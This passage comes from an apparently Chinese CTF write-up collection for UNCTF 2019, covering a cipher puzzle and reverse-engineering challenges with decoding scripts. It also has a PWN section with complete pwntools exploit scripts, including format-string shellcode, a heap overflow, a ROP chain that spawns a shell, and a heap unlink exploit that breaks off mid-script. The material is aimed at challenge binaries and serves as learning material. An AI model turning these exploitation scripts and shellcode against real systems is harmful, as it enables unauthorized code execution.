1.  浏览图片，在微博搜索长安十二时辰网络传信，找到相关制作组微博和相关解密教程

![](https://ctfwp.wetolink.com/2019unctf/12hours/d3a5a98fa23982dc022678243be085d4.png)

1.  在制作组微博找到望楼密码传信教程文件，寻找题目要求，"小望楼"的信号图

![](https://ctfwp.wetolink.com/2019unctf/12hours/9e63b4951ade1406956d41e3d66c9c6b.png)

![](https://ctfwp.wetolink.com/2019unctf/12hours/3a0806625f8bddc0cd1ab04b9fd28adb.jpg)

1.  解密附件图片内容，得到信息

`117 102 115 115 95 121 110 123 99 95 101 125 99 109 95 115 97 116 49 49 48 53`

1.  根据题目信息"扔掉密码本"，"现代编码"，猜想是ASCII码，转字符

2.  得到字符串

`ufss_yn{c_e}cm_sat1105`

1.  根据题目"越过栅栏"，猜想是栅栏密码，解密flag为

`unctf{m1sc_1s_s0_ea5y}`

## RE
### 666
#### 解题过程
File看文件信息，

![](https://ctfwp.wetolink.com/2019unctf/666/18830bacb785a81d457cb21b5a11115a.png)

打开它。让输入一串key，随便输入一些，说长度错误。

![](https://ctfwp.wetolink.com/2019unctf/666/8e4d9e34c237816baafe0b13d219087d.png)

拖入ida打开，找到程序入口，main函数，和关键函数strcmp()，encode()
在main函数里看到了需要2个条件才能获取flag一个是长度为key，

![](https://ctfwp.wetolink.com/2019unctf/666/4ba80128459793f2d7182e565359ea9f.png)

key为全局变量 为0x12

![](https://ctfwp.wetolink.com/2019unctf/666/f76bb6ec0c1e3943f7494281d272db7b.png)

也就是18个字符。

![](https://ctfwp.wetolink.com/2019unctf/666/05cdbdf77ca0f1c06ed7aa92cac45b3f.png)

在main函数中发现是变量s和enflag进行比较，一致则输出youareright，

![](https://ctfwp.wetolink.com/2019unctf/666/745e4aa44c10089dfab0e73fe571c525.png)

而s是经过encode后的字符，

enflag()内容:

![](https://ctfwp.wetolink.com/2019unctf/666/b276fcf3853c17ff9a254672104684a4.png)

将前三个字符转化为ascii，然后存放到一个数组里

得到了加密后的字符串，接着查看encode()函数，看看它的加密算法

![](https://ctfwp.wetolink.com/2019unctf/666/36cd9dbff06581630d2e8d00db368aec.png)

加密的过程是将用户输入的字符串，拆分成了3组，每组进行异或和加减运算之后累计到
一个变量里，将这个变量跟enflag做比较。

分析完成，编写脚本:

```
enflag=[0x69, 0x7A, 0x77, 0x68, 0x72, 0x6F, 0x7A, 0x22, 0x22, 0x77, 0x22, 0x76,  

0x2E, 0x4B, 0x22, 0x2E, 0x4E, 0x69] 
v3=[] 
v4=[] 
v5=[] 
v7=18 
flag='' 
fori inrange(0,len(enflag),3): 
    v5.append((enflag[i]^v7)-6) 
    v4.append((enflag[i+1]^v7)+6) 
    v3.append(enflag[i+2]^v7^6) 

forj inrange(v7/3): 
    flag+=chr(v5[j])+chr(v4[j])+chr(v3[j]) 
print flag 
```

![](https://ctfwp.wetolink.com/2019unctf/666/1cc08194ffd76642b2085edc2fe58729.png)

>   Flag:unctf{b66_6b6_66b}

### BabyMips
#### 原理知识
Mips架构的逆向是路由器漏洞挖掘的基础
#### 解题过程
1.  打开ubuntu，使用qemu模拟执行mips程序

![](https://ctfwp.wetolink.com/2019unctf/BabyMips/c4a5fc753cd4b83f2b91128f8c8e71b9.png)

2.  使用ghidra进行静态分析

![](https://ctfwp.wetolink.com/2019unctf/BabyMips/483117b67788d292d5bf7f3a6176c42a.png)

3.  发现核心函数为4007a0和401878，进入分析

![](https://ctfwp.wetolink.com/2019unctf/BabyMips/08168c5012b902541654a80785c3c669.png)

混淆较为严重，但是还是可以根据字符串以及移位运算特征识别出为改了表的base64

4.  进入第二个函数分析

![](https://ctfwp.wetolink.com/2019unctf/BabyMips/dd6f03e476c02761052758f718c5d1ad.png)

可以一开始的三个函数可以比较容易看出是rc4的s盒初始化，打乱s盒以及产生加密流的操作，因此可以初步判定为rc4加密算法

5.  我们有了密文，解密所需要的数据有 base64置换表，以及rc4的密钥

6.  通过静态分析可以基本上获得这些数据

7.  编写脚本解密即可

### babyre
#### 解题过程
1、 使用IDA打开二进制文件，可以看到main函数如下：

![](https://ctfwp.wetolink.com/2019unctf/babyre/8c2f990559961884bee8326f34a4cbe1.png)

2、 首先可以看到输入长度限制为32

3、 进入check后可以看到进一步的输入检查，限制为0-9a-z

4、 和某个表进行异或操作得到result，找到那个表t

5、 按照异或步骤，以最后strcmp中的target和表进行异或解码，即可得到结果


### BabyRe2
#### 解题过程
1）ida打开程序找到main函数

2）分析加密算法

首先会验证输入的flag里面是否含有-，若没有就会报错；然后验证输入的前六位UNCTF{以及最后一位}。

![](https://ctfwp.wetolink.com/2019unctf/BabyRe2/05f94634b8639d26686b72b8328c0a32.png)

当满足上述全部条件就会进入验证。将括号内部以-为判断标识进行截断，分两段进行验证

![](https://ctfwp.wetolink.com/2019unctf/BabyRe2/c65c946f54bd7608c3c885b2aeae8955.png)

这是第一段验证

![](https://ctfwp.wetolink.com/2019unctf/BabyRe2/dab3286717f05f27461913e79a0e453e.png)

这是第二段验证，点击进入函数内部

![](https://ctfwp.wetolink.com/2019unctf/BabyRe2/c8d5f0366935af5ca208ec3494f9c4bd.png)

这里就是第二段加密以及密文验证

3）编写两段解密脚本，拼接得到flag

### BabyXor
#### 解题过程
打开题目文件题目应该与Xor有关。

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/f922bde47434621964906c150b010584.png)

拖入ida进行查看。

发现段被修改。

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/dfd2413a4a8971d279b60640695b21e9.png)

使用OD调试

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/b00dcaf92ea5ea153713744faf74615d.png)

发现有0x31000个数据与0x23进行异或加密，并且最后跳转向了0x40c4a0

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/16a9f5f4f7b9506c59d39b35717df59b.png)

正好为.text段地址的大小，所以是text段与0x23进行了异或 所以改回来

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/825e4048d68245076a559b2f7c380612.png)

修改EntryPoint到真正的OEP

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/e34bb8ff2ae262daf0abfe99733ded6b.png)

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/886720b4fb3c428f06db3b3b86555b2e.png)

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/cbe0a07e30417db018d70781e6a2ae49.png)

保存文件程序正常运行

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/110e316fe9cdb1ee1bcb025a30b82055.png)

此时打开ida进行静态分析

程序恢复正常，查看main函数：

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/68f705e842539aa92507e177b6a7aa28.png)

有3个函数对unk_435dc0进行了操作:  
sub_40108C

sub_401041  
sub_4010C3

查看unk_435dc0，

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/5baa78c8e4d2fc431042b2b7a59575ff.png)

发现是占了4 byte的一些数据。

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/cdd726659e0e1e015059488f686b42c9.png)

接着分析函数:

sub_40108C

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/06938d6c9c20710aa2418bf0b089b593.png)

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/11aa2c75ccfa7154c0b79143396721c2.png)

有2个参数分别是a1和a2  
a1为刚刚传入的unk_435dc0

a2则是一个常量为56  
这个函数是将a1的值进行变量并根据当前循环次数进行异或

56则是sizeof的大小

第二个函数sub_401041：

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/78e2431516b7a7a71b413337d36b02fe.png)

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/74b21b4b705854bb135e7d6d8a2a3e6a.png)

3个参数a1 ,a2 ,a3:  
a1为unk_435dc0

a2为dword_435DF8  
a3为56，同为sizeof的大小

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/65e6c12b956bf29d515c68e7e1db886e.png)

同样为一串字符  
这个函数是将a1和[a2+1]的值进行异或运算后的返回结果与当前循环次数运算

第三个函数sub_4010C3:

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/66c1b32ee279fc1e41262303d7e7862e.png)

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/b2e6a73bb4c87c9bbc59fc1763de01c7.png)

a1: 并没有参与运算

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/17dbe6fe15ad141fc3a1b132cd7d72a4.png)

a2: 是第二个函数sub_401041的运算结果：

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/db1cc65da22f7126022c84b9ba7989d5.png)

a3:是dword_435E30

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/3bbf8970abc8010c5f5d703f31c43e56.png)

这个函数是将a2和[a3-1]的值进行异或运算后的返回结果与当前循环次数运算
然后与其他的函数的返回值进行拼接

但是它的循环次数是13次少了一位

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/ccb581e6db0efa1ea38167683fb3f423.png)

在14行发现将dword_435e30的第一个字母与dword_435df8的第一个字母进行了异或
运算也就是‘-

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/e8a8d3d1dab02db750e99b7442355872.png)

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/1962a45262e5bd64c0ed4b9433a556d2.png)

最后根据运算顺序进行逆推得到异或加密前的数据即为flag:

Reverse脚本如下:
```
#coding:utf-8 
List1 =[102, 109, 99, 100, 127, 55, 53, 48, 48, 107, 58, 60, 59, 32] 
List2 =[55, 111, 56, 98, 54, 124, 55, 51, 52, 118, 51, 98, 100, 122] 
List3 =[26, 0, 0, 81, 5, 17, 84, 86, 85, 89, 29, 9, 93, 18] 

defre_sub_1(value1): 
    ret ='' 
    fori inrange(len(value1)): 
        ret +=chr(value1[i]^i) 
    returnret 

defre_sub_2(value1,value2): 
    ret ='' 
    tmp =0 
    fori inrange(1,len(value2)): 
        tmp =value1[i-1]^value2[i] 
        tmp =tmp^value1[i] 
        ret +=chr(tmp) 
    ret =chr(value2[0])+ret 
    returnret 

defre_sub_3(value1,value2,value3): 
    ret ='' 
    tmp =0 
    fori inrange(len(value3)-1): 
        tmp =ord(value2[i])^value3[i+1] 
        ret +=chr(tmp^i) 
    ret =chr(value3[0]^ord(value2[0]))+ret 
    returnret 

flag1 =re_sub_1(List1) 
flag2 =re_sub_2(List1,List2) 
flag3 =re_sub_3(0,flag2,List3)#第一个参数任意 
print flag1+flag2+flag3 
```

![](https://ctfwp.wetolink.com/2019unctf/BabyXor/f52a9d08afa2238263023618347e90d1.png)

`Flag:flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}`

### easy reverse
#### 解题过程
使用IDA32打开文件,找不到main()函数，选择从字符串入口
Shift+F12打开字符串窗口发现

![](https://ctfwp.wetolink.com/2019unctf/easy_reverse/fe6038ba2c5fc87fd8a808a8e6fde14b.png)

关键字符串，点进去

![](https://ctfwp.wetolink.com/2019unctf/easy_reverse/b4aac4a03468dbbf1f170574388964fa.png)

利用交叉索引到调用函数F5

![](https://ctfwp.wetolink.com/2019unctf/easy_reverse/4e53302dd96da918542899b3e159bd6d.png)

前面是定义的字符串

分析程序可以知道：  
输入的格式必须为`unctf{*************}`且长度须为27

![](https://ctfwp.wetolink.com/2019unctf/easy_reverse/68cc8cfeb89da48c936f1072b653ebaf.png)

由该for循环可以知道输入的字符必须为`0~9,a~z,A~Z`

![](https://ctfwp.wetolink.com/2019unctf/easy_reverse/814ec56db3657258d67f3966344978f2.png)

该字符串为UNCTFisv3ryin4r3stin9

![](https://ctfwp.wetolink.com/2019unctf/easy_reverse/a77c89923864374fdec0380a9cb8eb67.png)

该判断把输入的值（输入到v8）当作数组v21的下标值取出对应字符，当满
足最后组成的字符串为v14（v15开头）"UNCTFisv3ryin4r3stin9"时即为正确的pass
好了，这就是本题思路。

接下来写exp

```
s1='''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&*()_+<>?:'''
s2='UNCTFisv3ryin4r3stin9'
flag=''
a=[]
for i in s2:
	a.append(s1.index(i))
def check(i,f):
    m = i + f
    if(48<=m<=57) and (f==48):
        return True
    elif (97<=m<=122) and (f==87):
        return True
    elif (65<=m<=90) and (f==29):
        return True
    return False

for i in a:
    if check(i,48):
        flag+=chr(i+48)
    if check(i,87):
        flag+=chr(i+87)
    if check(i,29):
        flag+=chr(i+29)
print(flag)

```

![](https://ctfwp.wetolink.com/2019unctf/easy_reverse/d9e5294c97f75b7ea0da65ea160438f5.png)

得到KDsJv8ilTho8dUhTij8dZ  
所以flag为：unctf{KDsJv8ilTho8dUhTij8dZ}

### easy_android
#### 解题过程
使用反编译工具观察程序流程,发现纯java层面上的验证

![](https://ctfwp.wetolink.com/2019unctf/easy_android/07282cd1aacd657cf13963093d43a431.png)

从资源中取得一个string 查看这个string 为app_name 值为 themix

会对输入和这个str传入调用d.a()

查看函数内容

![](https://ctfwp.wetolink.com/2019unctf/easy_android/7db989cf6aeb12add1d2c492f739f9bc.png)

而后 把这三个参数一起传入 e().a()中

观察内容

![](https://ctfwp.wetolink.com/2019unctf/easy_android/3a71f987fdc1659637b191ef86327711.png)

观察操作首先对输入进行和传入的app_name进行xor 而后进行 分割

调用b.a()方法经过分析 可以发现是求hash的操作

而后和构造函数中初始化的字符串进行对比

![](https://ctfwp.wetolink.com/2019unctf/easy_android/3014e1f1e6e20db2967f7a9f6538b219.png)

写脚本爆破 脚本写的足够优雅 很快就能爆破出来

![](https://ctfwp.wetolink.com/2019unctf/easy_android/aa66beed4ed00105346fc17457febafc.png)

加上UNCTF{}外壳提交

### easy_Maze
#### 原理知识
1）	求逆矩阵的公式为：![](https://ctfwp.wetolink.com/2019unctf/easy_Maze/1.png)

2）	求逆转矩阵公式：a[i][j]=a[j][n-i-1].

#### 解题过程
1.  首先使用IDA打开，F5分析主函数。如下图所示，看到很多数字，根据题目名称可以判断这是迷宫里的数值，我们又看到下面Step_0()和Step_1()函数对矩阵进行了操作。

![](https://ctfwp.wetolink.com/2019unctf/easy_Maze/3bc1261bf0887d3266e37aff061047ce.png)

1.  跟进Step_0()，这里进行的操作就是遍历整个矩阵并进行arr[i][j]=src[j][n-i-1]，并将值传给v7。其实就是逆转矩阵的操作。  


![](https://ctfwp.wetolink.com/2019unctf/easy_Maze/239ae0983e4d021a1e1884b78205b279.png)

2.  跟进Step_1()，细心分析代码，其中getA()是得到矩阵的行列值|A|,getAStart()是计算伴随矩阵A*。下面的for循环就是计算得到矩阵的逆矩阵A-1。求逆矩阵的公式为：![](https://ctfwp.wetolink.com/2019unctf/easy_Maze/7635e4467a88626503b4805164e8f750.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_Maze/72f64b32015e4807856fd1906484b291.png)

3.  最后分析Step_2(),又是一顿代码分析，w,a,s,d分别代表上，左，下，右，再看下面v10和v9判断迷宫为7*7的矩阵。  


![](https://ctfwp.wetolink.com/2019unctf/easy_Maze/2b6922ca95483b54e78b64ff4b664dc5.png)

4.  提取矩阵值，写脚本解题，得到正确迷宫，得到迷宫路径即为flag.

![](https://ctfwp.wetolink.com/2019unctf/easy_Maze/5f4fcbfd81d9722b73d66cf4a796f643.png)
### easyvm
#### 解题过程
简单的用c++模拟了一下汇编运算

1、 首先main函数中可以看到flag长度为32字节

![](https://ctfwp.wetolink.com/2019unctf/easyvm/e2d85ce361d3ee98f4161c4e9d105cc8.png)

2、 其中unk_602080和unk_6020A0数组可以找到

![](https://ctfwp.wetolink.com/2019unctf/easyvm/b70e6b4b14e5c5b782ae0585943d9ab9.png)

3、 在sub_400C1E中可以找到v3的初始化

![](https://ctfwp.wetolink.com/2019unctf/easyvm/a54d88edb284663f00ac766aec5d3421.png)

4、 然后查看函数sub_400806，还其中的case的每个操作函数（详见源码） 

5、根据`*(a1+8)`指针的变化可以看到实现了指令运行逻辑如下

```
// data[i]=0xCD^data[i-1]^(input[i]-i)  
/*   
loop:  
   mov reg1,input[reg3]  
   dec reg1,reg3  
   xor reg2,reg1  
   mov reg1,0xCD  
   xor reg1,reg2  
   cmp reg1,data[i]  
   mov reg2,reg1  
   jz continue  
   return 0  
continue:  
    inc reg3  
    cmp reg3,const  
    jb loop  
    return 1  
*/  
```

最后对着逆就ok了

### old17.rtf
#### Hint
OFFICE 2017年某CVE

我们用office打开它会发生什么呢
#### 解题过程
```
t=[0x8B,0xfc,0x45,0x8b]
b=[0xde,0xb2,0x6,0xdf,0xcd,0x87,0x72,0xe9,0xbf,0xc8,0x77,0xee,0xef,0x9f,0x7c,0xbe,0xb8,0xc8,0x23,0xed,0xbb,0xcc,0x73,0xef,0xed,0xc5,0x7c,0xb8,0xee,0xce,0x7c,0xb9,0xbf,0xc8,0x7c,0xbf,0xbd,0x9d,0x38,0xaa]
s=""
for i in range(0,len(b),4):
    s+=chr(t[0]^b[i])
    s+=chr(t[1]^b[i+1])
    s+=chr(t[2]^b[i+2])
    s+=chr(t[3]^b[i+3])

print s
```
### rookie_reverse
#### 解题过程
1.  运行程序,发现需要输入flag

2.  使用ida查看伪c代码

![](https://ctfwp.wetolink.com/2019unctf/rookie_reverse/30e0b996dcaffa6b11c5c11f16c503e1.png)

1.  分析后发现需要满足字符串比较相同的要求,于是分析上面的程序过程

2.  发现有一个循环,将输入的字符串的每一个字符与0x16异或,然后加了1,再赋值回去,然后判断是否与指定字符串相等,所以编写脚本如下

3.  先将字符ascii值减1,然后再与0x16异或一遍,因为字符与同样的字符异或两次会等于本身,所以我们得到了答案

![](https://ctfwp.wetolink.com/2019unctf/rookie_reverse/d9570fdc9e372ca07464d79875335ba4.png)

### Very_Easy_Re
#### 解题过程
点开程序，随便输入一点东西，得到

![](https://ctfwp.wetolink.com/2019unctf/Very_Easy_Re/eed42543b7129bb5a1afc95a2dfbff16.png)

进入IDA，通过字符串搜索进入主函数

![](https://ctfwp.wetolink.com/2019unctf/Very_Easy_Re/41d3e165fdce0438c3a2e2c7d9313bc3.png)

看到

![](https://ctfwp.wetolink.com/2019unctf/Very_Easy_Re/824c3e8bb7ac597bf4c72f128b69d29d.png)

这里的时候点进去

![](https://ctfwp.wetolink.com/2019unctf/Very_Easy_Re/7108d24022b05cca668aeb68dda4b492.png)

发现应该是一个base64加密，而且密码表都和网上的一样

再往下看

![](https://ctfwp.wetolink.com/2019unctf/Very_Easy_Re/01bc6a0a3ab8737d0d90b7c45819a61d.png)

只是很简单的将上面加密之后的字符串位移了一下

再往下看就找到了需要处理的字符串

![](https://ctfwp.wetolink.com/2019unctf/Very_Easy_Re/f4f9ea0fc129c48b47e066ef85dbca7c.png)

根据上述加密过程倒推回去写出解密脚本

```
import base64
a = "WV6EWF[8dGU5]Y<pQZ8iPZ8iSKk7gnh="
flag = ""
for i in range(len(a)):
    if(i < 8):
        flag += chr(ord(a[i]) - 1)
    if(8 <= i < 16):
        flag += chr(ord(a[i]) - 3)   
    if(16 <= i < 24):
       flag += chr(ord(a[i]) - 3)
    if(24 <= i < 32):
        flag += chr(ord(a[i]) - 4)      
flag = base64.b64decode(flag+'=')
#这里需要使用一个’=’来占位，不然会出现
#binascii.Error: Incorrect padding的错误
print(flag)
```

### 没事，应该不难
#### 解题过程
main的构建函数和析构函数 + 精简版的base64是否还能看出

解题思路路

![](https://ctfwp.wetolink.com/2019unctf/not_diffcult/a03e689911cc349ac651238f9e545db1.png)

首先，main函数中的所有内容都是没有⽤用的，全是虚假内容，之后通过区段表发现

![](https://ctfwp.wetolink.com/2019unctf/not_diffcult/e9208eb026f56fb7a4dd839c085aef3e.png)

这两个区段中存在不不⽌止⼀一个函数，说明有不不⽌止⼀一个函数在main之前和之后运⾏行行

跟进函数发现其中⼀一个在main之前的函数会将scanf和printf给⽆无效化

![](https://ctfwp.wetolink.com/2019unctf/not_diffcult/d4265f01800c8a5ba9b37450c5cf2b4e.png)

会在main之后的函数⾥里里进⾏行行真正的解密流程，就是个变表的base64，还被精简过了
### 奇怪的数组
#### 原理知识
1） 程序逻辑首先检查了所输字符串是否有 flag{}包裹。然后两个一组进行检查， 由函数 char2hex 的代码及函数名可知，
该函数的作用为将字符转换成对应的 16 进制数返回。 返回后的 16 进制与 checkbox 的对应项进行对比。全部对比成功即可得到 flag
#### 解题过程
1） IDA 载入程序并找到 main 函数， F5 反编译获得结果如下图所示：

![](https://ctfwp.wetolink.com/2019unctf/str_list_pro/1.png)

2） 阅读程序执行逻辑，编写脚本解出 flag

![](https://ctfwp.wetolink.com/2019unctf/str_list_pro/2.png)

### 调试器的初体验
#### 原理知识
1） 被壳保护的程序难以被反汇编工具分析
2） VMP 壳检测到调试器时会弹出提示信息
#### 解题过程
1） 将程序拖入 exeinfo 发现程序被加了 VMP 壳

![](https://ctfwp.wetolink.com/2019unctf/first_try/1.png)

2） 结合程序名分析，将程序拖入 OllyDebug， F9 运行， 发现 VMP 检测到调试器后的提示信息被设置
为一段 base64，其密文如下：

![](https://ctfwp.wetolink.com/2019unctf/first_try/2.png)

3） 将 base64 密文解密即可得到 flag，解密脚本如下：
```
import base64
print(base64.b64encode("ZmxhZ3sxNmNlYTM3ZTUzNDA1YThiMWl4YTdkZTlxOWU4ZWRkMX0="))
```
解密结果为: flag{16cea37e53405a8b1b8a7de219e8edd1}

## PWN
### babyfmt
#### 原理知识
1）	Printf的漏洞和shellcode
#### 解题过程
1）先确定buf的偏移，并ebp leak，这样就可以推算出ret和buf的地址，然后通过%{}$hn写入ret为buf的下半部分，然后下半部分恰好放置shellcode，这样就可以执行shellcode拿到shell

2)Exp:
```
#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "i386"
elf = ELF("babyfmt")
sh = 0
lib = 0
def pwn(ip,port,debug):
	global sh
	global lib
	if(debug == 1):
		sh = process("./babyfmt")
	else:
		sh = remote(ip,port)
	sh.recvuntil("Please input your message:")
	payload = "%22$p"
	sh.send(payload)
	ebp = int(sh.recv(10),16)
	ret = ebp - (0xffb66408 - 0xffb663ec)
	buf_addr = ebp - (0xffb66408 - 0xffb66390)
	payload = p32(ret) + p32(ret + 2) + "%." + str(buf_addr % 0x10000 + 0x28 - 7) + "d%4$hn"
	payload += "%." + str((buf_addr >> 16) - (buf_addr % 0x10000) - 0x28 - 2) + "d%5$hn"
	payload = payload.ljust(0x28,'\x00')
	payload += "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
	log.success("ret: " + hex(ret))
	log.success("ebp: " + hex(ebp))
	log.success("buf_addr: " + hex(buf_addr))
	sh.sendline(payload)
	sh.interactive()
if __name__ == "__main__":
	pwn("127.0.0.1",10000,1)
```

### babyheap
#### 原理知识
1）	了解栈溢出，并灵活使用rop技术
#### 解题过程
1）chunk中带有puts_got，通过末尾连接，通过show功能就可以知道libc，从而计算出system地址

2）程序中有明显的堆溢出，所以直接覆盖chunk中的puts为system，然后show一个内容为/bin/sh的chunk，即可拿到shell
Exp如下：
```
#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "amd64"
elf = ELF("pwn")
sh = 0
lib = 0
def add(content):
	sh.sendlineafter("Your choice: ","1")
	sh.send(content);
def edit(idx,size,content):
	sh.sendlineafter("Your choice: ","2")
	sh.sendlineafter(":",str(idx))
	sh.sendlineafter(":",str(size))
	sh.sendafter(":",content)
def free(idx):
	sh.sendlineafter("Your choice: ","4")
	sh.sendlineafter(":",str(idx))
def show(idx):
	sh.sendlineafter("Your choice: ","3")
	sh.sendlineafter(":",str(idx))
def pwn(ip,port,debug):
	global sh
	global lib
	if(debug == 1):
		sh = process("./pwn")
		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	else:
		sh = remote(ip,port)
		lib = ELF("x64_libc.so.6")
	add('a' * 0x10)
	edit(0,0x100,'a' * 0x18)
	show(0)
	puts = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
	libc = puts - lib.symbols['puts']
	system = libc +lib.symbols['system']
	payload = '/bin/sh\x00'
	payload = payload.ljust(0x18,'a')
	payload += p64(system)
	edit(0,0x100,payload)
	show(0)
	log.success("libc: " + hex(libc))
	log.success("system: " + hex(system))
	sh.interactive()
if __name__ == "__main__":
	pwn("127.0.0.1",9090,0)
 ```
 
![](https://ctfwp.wetolink.com/2019unctf/babyheap/1.png)


### babyrop
#### 原理知识
1）	了解栈溢出，并灵活使用rop技术
#### 解题过程
1）首先覆盖变量，然后开启后门，然后通过后门函数来libc leak，然后再次回到后门函数，再次跳转到libc空间执行system("/bin/sh\x00")，需要注意的是，对ret地址进行了check，所以先跳到ret上，然后通过check再到libc空间。

Exp如下：
```
#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "i386"
elf = ELF("pwn")
sh = 0
lib = 0
def pwn(ip,port,debug):
	global sh
	global lib
	if(debug == 1):
		sh = process("./pwn")
		lib = ELF("/lib/i386-linux-gnu/libc.so.6")
	else:
		sh = remote(ip,port)
		lib = ELF("x86_libc.so.6")
	offset = 0x20
	payload = offset * 'a' + p32(0x66666666)
	sh.sendafter("CTFer!",payload)
	pop_ret = 0x0804865b
	offset = 0x14
	payload = offset * "a" + p32(elf.plt['puts']) + p32(pop_ret) + p32(elf.got['__libc_start_main']) + p32(0x0804853D)
	sh.sendafter("?\n",payload)
	__libc_start_main = u32(sh.recvuntil("\xf7")[-4:])
	libc = __libc_start_main - lib.symbols['__libc_start_main']
	system = libc +lib.symbols['system']
	binsh = libc +lib.search("/bin/sh\x00").next()
	offset = 0x14
        payload = offset * "a" + p32(0x0804839e) + p32(system) + p32(pop_ret) + p32(binsh)
	sh.sendafter("?\n",payload)
	log.success("libc: " + hex(libc))
	log.success("system: " + hex(system))
	log.success("binsh: " + hex(binsh))
	sh.interactive()
if __name__ == "__main__":
	pwn("127.0.0.1",9090,0)
```
运行结果如下：

![](https://ctfwp.wetolink.com/2019unctf/babyrop/1.png)

### Driver
#### 原理知识
1）	通过off by one实现unlink，然后通过unlink实现House of spirit，从而实现堆块重叠
#### 解题过程
1）运行程序，初步测试功能

![](https://ctfwp.wetolink.com/2019unctf/Driver/1.png)

2）导入IDA分析，发现只能购买三种车，A车可以申请到0x68的堆块，B车可以申请到0xf8的堆块，C车可以申请到0x220的堆块。在edit函数发现off by one，但是只能用一次，利用B车的堆块可以实现unlink，然后通过SpeedUp功能，在特定位置设置FakeFastbin的size位，并且同时可以覆盖name的指针，但是这样无法触发getLiscense功能修改__free_hook，且没有办法知道libc位置，所以将第一辆车的指针改到第二辆车的speed位，然后House of Spirit通过第一辆车的name指针来修改第二辆车的结构体，通过修改第二辆车的指针，可以通过show的功能leak libc，然后通过unsorted bin attack，修改Liscense的数据为一个很大值，同时在第二辆车的name指针覆盖为__free_hook，通过backdoor额外获得一次edit的功能来修改__free_hook为system，同时设置好/bin/sh\x00字符串即可拿到shell。

脚本如下：
```
#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "amd64"
elf = ELF("pwn")
sh = 0
lib = 0
def add(idx,content):
	sh.recvuntil(">>")
	sh.sendline("1")
	sh.recvuntil(">>")
	sh.sendline(str(idx))
	sh.recvuntil(":")
	sh.send(content)
def show():
	sh.recvuntil(">>")
	sh.sendline("2")
def free(idx):
	sh.recvuntil(">>")
	sh.sendline("3")
	sh.recvuntil(":")
	sh.sendline(str(idx))
def edit(idx,content):
	sh.recvuntil(">>")
	sh.sendline("4")
	sh.recvuntil(":")
	sh.sendline(str(idx))
	sh.recvuntil(":")
	sh.send(content)
def gift():
	sh.recvuntil(">>")
	sh.sendline("8")
	sh.recvuntil("gift: ")
	return int(sh.recvuntil("\n",True),16)
def up1(idx):
	sh.recvuntil(">>")
	sh.sendline("5")
	sh.recvuntil(":")
	sh.sendline(str(idx))
	sh.recvuntil(">>")
	sh.sendline("1")
	sh.recvuntil(">>")
	sh.sendline("1")
	sh.recvuntil("Car's Speed is ")
	return int(sh.recvuntil("Km/h",True),10)
def getlicense(idx,content):
	sh.recvuntil(">>")
	sh.sendline("6")
	sh.recvuntil(":")
	sh.sendline(str(idx))
	sh.recvuntil(":")
	sh.sendline(content)
def up2(idx):
	sh.recvuntil(">>")
	sh.sendline("5")
	sh.recvuntil(":")
	sh.sendline(str(idx))
	sh.recvuntil(">>")
	sh.sendline("1")
	sh.recvuntil(">>")
	sh.sendline("2")
	sh.recvuntil("Car's Speed is ")
	return int(sh.recvuntil("Km/h",True),10)
def down(idx):
	sh.recvuntil(">>")
	sh.sendline("5")
	sh.recvuntil(":")
	sh.sendline(str(idx))
	sh.recvuntil(">>")
	sh.sendline("2")
def pwn(ip,port,debug):
	global sh
	global lib
	if(debug == 1):
		sh = process("./pwn")
		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	else:
		sh = remote(ip,port)
		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	add(3,'\x11' * 0x220) #idx 0
	add(2,'\x22' * 0xf8) #idx 1
	free(1)
	free(0)
	add(2,"\n") #idx 0
	add(2,"\x44" * 0xf8) #idx 1
	heap_base = gift()
	heap_base = (heap_base >> 12) << 12
	payload = ''
	payload += p64(0) + p64(0xf1) 
	payload += p64(heap_base + 0x58 - 0x18) + p64(heap_base + 0x58 - 0x10)
	payload += p64(0) * 3 + p64(0x1234)
	payload = payload.ljust(0xf0,'\x55')
	payload += p64(0xf0)
	edit(0,payload)
	free(1)
	for i in range(48):
		down(0)
	for i in range(3):
		up1(0)
	for i in range(3):
		up2(0)
	up1(0)
	payload = ''
	payload += p64(0) * 7 + p64(0x1234)
	payload = payload.ljust(0x220,'\x66')
	add(3,payload)
	free(0)
